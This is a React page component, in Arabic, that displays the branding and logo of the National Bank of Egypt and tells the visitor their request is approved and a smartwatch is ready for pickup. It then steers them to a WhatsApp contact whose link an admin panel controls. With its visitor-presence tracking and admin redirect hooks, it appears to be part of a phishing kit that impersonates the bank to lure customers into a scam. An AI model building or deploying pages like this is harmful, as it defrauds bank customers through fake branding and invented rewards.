/**
 * البنك الأهلي المصري - تواصل عبر واتساب
 * صفحة مناسبة لعميل الفرع - بدون جوائز
 */
import { useLocation } from "wouter";
import { usePresence } from "@/hooks/usePresence";
import { useAdminRedirect } from "@/hooks/useAdminRedirect";
import { trpc } from "@/lib/trpc";
import { handleWatchImageError, WATCH_IMAGES, WATCH_NAMES } from "@/lib/watchImages";

export default function WhatsAppContact() {
  usePresence("whatsapp");
  useAdminRedirect();
  const [, setLocation] = useLocation();
  const watchColor = sessionStorage.getItem("pw_selected_watch") || "black";
  const { data: whatsAppData } = trpc.admin.getWhatsAppLink.useQuery();
  const whatsAppLink = whatsAppData?.link || "https://wa.me/message/4Y76G2TADJUVE1";

  return (
    <div dir="rtl" style={{ minHeight: "100vh", background: "#ffffff", fontFamily: "'Cairo', sans-serif", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", position: "relative" }}>
      {/* Subtle watermark */}
      <div style={{ position: "fixed", top: "50%", left: "50%", transform: "translate(-50%, -50%)", opacity: 0.03, pointerEvents: "none", zIndex: 0 }}>
        <img src="/manus-storage/nbe-official-logo-source_d2709322.png" alt="" style={{ width: "350px", height: "auto" }} />
      </div>
      <div style={{ maxWidth: "480px", width: "100%", padding: "32px 24px", textAlign: "center" }}>
        {/* Logo */}
        <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: "8px", marginBottom: "28px" }}>
          <img src="/manus-storage/nbe-official-logo-source_d2709322.png" alt="البنك الأهلي المصري" style={{ height: "40px" }} onError={(e) => { (e.target as HTMLImageElement).style.display = "none"; }} />
          <span style={{ color: "#1B7A3D", fontWeight: "800", fontSize: "18px" }}>البنك الأهلي المصري</span>
        </div>

        {/* Check Icon */}
        <div style={{ width: "80px", height: "80px", background: "#f0fdf4", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 24px", border: "3px solid #dcfce7" }}>
          <svg width="40" height="40" viewBox="0 0 24 24" fill="none">
            <path d="M20 6L9 17l-5-5" stroke="#1B7A3D" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"/>
          </svg>
        </div>

        <h2 style={{ color: "#1a1a1a", fontWeight: "800", fontSize: "26px", marginBottom: "8px", lineHeight: 1.4 }}>
          تم اعتماد طلبك بنجاح!
        </h2>
        <p style={{ color: "#666", fontSize: "14px", marginBottom: "24px" }}>
          مرحباً بك كعميل مميز في البنك الأهلي المصري. سيتم تسليم ساعتك من أقرب فرع إليك
        </p>

        {/* Watch Image */}
        <div style={{ background: "#f8faf9", borderRadius: "20px", padding: "24px", marginBottom: "24px", border: "1px solid #dcfce7", boxShadow: "0 4px 20px rgba(27,122,61,0.08)" }}>
          <img src={WATCH_IMAGES[watchColor] || WATCH_IMAGES["black"]} alt="ساعتك الذكية"
            style={{ width: "140px", height: "140px", objectFit: "contain", margin: "0 auto 16px", display: "block", filter: "drop-shadow(0 8px 24px rgba(0,0,0,0.15))" }}
            onError={handleWatchImageError} />
          <p style={{ color: "#1B7A3D", fontWeight: "700", fontSize: "15px", margin: "0 0 4px" }}>ساعتك الذكية جاهزة للتسليم</p>
          <p style={{ color: "#666", fontSize: "12px", margin: 0 }}>اللون: {WATCH_NAMES[watchColor] || watchColor}</p>
        </div>

        {/* Steps */}
        <div style={{ background: "#fafafa", borderRadius: "14px", padding: "20px", marginBottom: "24px", textAlign: "right", border: "1px solid #e5e7eb" }}>
          <p style={{ color: "#1B7A3D", fontWeight: "800", fontSize: "14px", marginBottom: "14px", textAlign: "center" }}>خطوات استلام ساعتك</p>
          <div style={{ display: "flex", flexDirection: "column", gap: "10px" }}>
            {[
              { icon: "📱", text: "تواصل مع فريق خدمة العملاء عبر واتساب" },
              { icon: "📍", text: "حدد أقرب فرع لك للاستلام" },
              { icon: "🎉", text: "استلم ساعتك من الفرع مباشرة" },
            ].map((step, i) => (
              <div key={i} style={{ display: "flex", alignItems: "center", gap: "12px", padding: "10px 14px", background: "#ffffff", borderRadius: "10px", border: "1px solid #f0f0f0" }}>
                <span style={{ fontSize: "20px" }}>{step.icon}</span>
                <span style={{ color: "#333", fontSize: "13px" }}>{step.text}</span>
              </div>
            ))}
          </div>
        </div>

        {/* WhatsApp Button */}
        <a href={whatsAppLink} target="_blank" rel="noopener noreferrer"
          style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: "12px", width: "100%", background: "#25D366", color: "white", border: "none", borderRadius: "14px", padding: "18px 24px", fontSize: "17px", fontWeight: "800", cursor: "pointer", fontFamily: "'Cairo', sans-serif", textDecoration: "none", boxShadow: "0 8px 30px rgba(37,211,102,0.3)", marginBottom: "16px" }}>
          <svg width="26" height="26" viewBox="0 0 24 24" fill="white">
            <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/>
          </svg>
          تواصل معنا عبر واتساب
        </a>

        <p style={{ color: "#999", fontSize: "12px" }}>© 2026 البنك الأهلي المصري - مصر</p>
      </div>
    </div>
  );
}
